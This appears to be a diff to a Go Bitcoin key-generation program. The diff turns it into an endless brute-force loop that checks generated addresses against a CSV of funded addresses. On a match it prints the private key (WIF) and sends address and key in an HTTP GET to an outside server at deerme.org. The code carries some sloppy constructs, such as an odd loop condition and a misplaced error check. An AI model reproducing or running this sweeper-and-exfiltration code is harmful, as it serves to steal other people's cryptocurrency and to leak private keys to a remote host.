@@ -1,12 +1,20 @@
 package main
 
+// Calling
+// go run main.go -n 100 -bip39 -mnemonic "traffic work throw analyst empty latin damp panther snake funny canal fuel"
+
+
+
 import (
 	"flag"
 	"fmt"
 	"log"
 	"strings"
 	"sync"
-
+	"os"
+	"bufio"
+	"time"
+	"net/http"
 	"github.com/btcsuite/btcd/btcec"
 	"github.com/btcsuite/btcd/chaincfg"
 	"github.com/btcsuite/btcd/txscript"
@@ -14,6 +22,8 @@ import (
 	"github.com/tyler-smith/go-bip32"
 	"github.com/tyler-smith/go-bip39"
 )
+
+var dbhash map[string]string
 
 // Purpose BIP43 - Purpose Field for Deterministic Wallets
 // https://github.com/bitcoin/bips/blob/master/bip-0043.mediawiki
@@ -322,83 +332,96 @@ func main() {
 	number := flag.Int("n", 10, "set number of keys to generate")
 	mnemonic := flag.String("mnemonic", "", "optional list of words to re-generate a root key")
 
-	flag.Parse()
+	dbhash = make(map[string]string)
+	// Reading file
+	//file, err := os.Open("/home/deerme/Downloads/btc_balance_sorted.csv") 
+	file, err := os.Open("./btc_balance_sorted.csv") 	
 
-	if !*bip39 {
-		fmt.Printf("\n%-34s %-52s %-42s %s\n", "Bitcoin Address", "WIF(Wallet Import Format)", "SegWit(bech32)", "SegWit(nested)")
-		fmt.Println(strings.Repeat("-", 165))
+    scanner := bufio.NewScanner(file) 
+	if err != nil { 
+        log.Fatalf("failed to open")   
+    } 
+    scanner.Split(bufio.ScanLines) 
+    for scanner.Scan() {
+		var record []string = strings.Split(scanner.Text(),",")
+		if ( len( record[1] ) >= 4 ){
+			dbhash[record[0]] = record[1]
+		}
+    } 
+    file.Close() 
 
+	for x := 0; x < x+1 ; x++{
+		flag.Parse()
+
+		if !*bip39 {
+			fmt.Printf("\n%-34s %-52s %-42s %s\n", "Bitcoin Address", "WIF(Wallet Import Format)", "SegWit(bech32)", "SegWit(nested)")
+			fmt.Println(strings.Repeat("-", 165))
+
+			for i := 0; i < *number; i++ {
+				wif, address, segwitBech32, segwitNested, err := Generate(compress)
+				if err != nil {
+					log.Fatal(err)
+				}
+				fmt.Printf("%-34s %s %s %s\n", address, wif, segwitBech32, segwitNested)
+			}
+			fmt.Println()
+			return
+		}
+
+		km, err := NewKeyManager(128, *pass, *mnemonic)
+		if err != nil {
+			log.Fatal(err)
+		}
+		masterKey, err := km.GetMasterKey()
+		if err != nil {
+			log.Fatal(err)
+		}
+		passphrase := km.GetPassphrase()
+		if passphrase == "" {
+			passphrase = "<none>"
+		}
+		fmt.Printf("\n%-18s %s\n", "BIP39 Mnemonic:", km.GetMnemonic())
+		fmt.Printf("%-18s %s\n", "BIP39 Passphrase:", passphrase)
+		fmt.Printf("%-18s %x\n", "BIP39 Seed:", km.GetSeed())
+		fmt.Printf("%-18s %s\n", "BIP32 Root Key:", masterKey.B58Serialize())
+
+		fmt.Printf("\n%-18s %-34s %-52s\n", "Path(BIP44)", "Bitcoin Address", "WIF(Wallet Import Format)")
+		fmt.Println(strings.Repeat("-", 106))
 		for i := 0; i < *number; i++ {
-			wif, address, segwitBech32, segwitNested, err := Generate(compress)
+			key, err := km.GetKey(PurposeBIP44, CoinTypeBTC, 0, 0, uint32(i))
 			if err != nil {
 				log.Fatal(err)
 			}
-			fmt.Printf("%-34s %s %s %s\n", address, wif, segwitBech32, segwitNested)
-		}
-		fmt.Println()
-		return
-	}
+			wif, address, _, _, err := key.Encode(compress)
+			if err != nil {
+				log.Fatal(err)
+			}
+			if wif == "xD"{
+				log.Fatal(err)
+			}
 
-	km, err := NewKeyManager(128, *pass, *mnemonic)
-	if err != nil {
-		log.Fatal(err)
-	}
-	masterKey, err := km.GetMasterKey()
-	if err != nil {
-		log.Fatal(err)
-	}
-	passphrase := km.GetPassphrase()
-	if passphrase == "" {
-		passphrase = "<none>"
-	}
-	fmt.Printf("\n%-18s %s\n", "BIP39 Mnemonic:", km.GetMnemonic())
-	fmt.Printf("%-18s %s\n", "BIP39 Passphrase:", passphrase)
-	fmt.Printf("%-18s %x\n", "BIP39 Seed:", km.GetSeed())
-	fmt.Printf("%-18s %s\n", "BIP32 Root Key:", masterKey.B58Serialize())
+			key_data, ok := dbhash[address]
+			if ok {
+				fmt.Printf("=========================")
+				fmt.Printf("time '%s'\n",time.Now().String())
+				fmt.Printf("address '%s\n'",address)
+				fmt.Printf("wif '%s'\n",wif)
+				fmt.Printf("path '%s'\n",key.GetPath())						
+				fmt.Printf("data '%s'", key_data)
+				resp, err := http.Get("https://deerme.org/btc/index.php?data=" + address + ":" + wif  + ":")
+				if err != nil {
+					log.Fatalln(err)
+					fmt.Println(resp)
+				}
+				
+				
+			}
 
-	fmt.Printf("\n%-18s %-34s %-52s\n", "Path(BIP44)", "Bitcoin Address", "WIF(Wallet Import Format)")
-	fmt.Println(strings.Repeat("-", 106))
-	for i := 0; i < *number; i++ {
-		key, err := km.GetKey(PurposeBIP44, CoinTypeBTC, 0, 0, uint32(i))
-		if err != nil {
-			log.Fatal(err)
-		}
-		wif, address, _, _, err := key.Encode(compress)
-		if err != nil {
-			log.Fatal(err)
-		}
 
-		fmt.Printf("%-18s %-34s %s\n", key.GetPath(), address, wif)
+			
+			//fmt.Printf("%-18s %-34s %s\n", key.GetPath(), address, wif)
+		}
+		
+
 	}
-
-	fmt.Printf("\n%-18s %-34s %s\n", "Path(BIP49)", "SegWit(nested)", "WIF(Wallet Import Format)")
-	fmt.Println(strings.Repeat("-", 106))
-	for i := 0; i < *number; i++ {
-		key, err := km.GetKey(PurposeBIP49, CoinTypeBTC, 0, 0, uint32(i))
-		if err != nil {
-			log.Fatal(err)
-		}
-		wif, _, _, segwitNested, err := key.Encode(compress)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		fmt.Printf("%-18s %s %s\n", key.GetPath(), segwitNested, wif)
-	}
-
-	fmt.Printf("\n%-18s %-42s %s\n", "Path(BIP84)", "SegWit(bech32)", "WIF(Wallet Import Format)")
-	fmt.Println(strings.Repeat("-", 114))
-	for i := 0; i < *number; i++ {
-		key, err := km.GetKey(PurposeBIP84, CoinTypeBTC, 0, 0, uint32(i))
-		if err != nil {
-			log.Fatal(err)
-		}
-		wif, _, segwitBech32, _, err := key.Encode(compress)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		fmt.Printf("%-18s %s %s\n", key.GetPath(), segwitBech32, wif)
-	}
-	fmt.Println()
 }
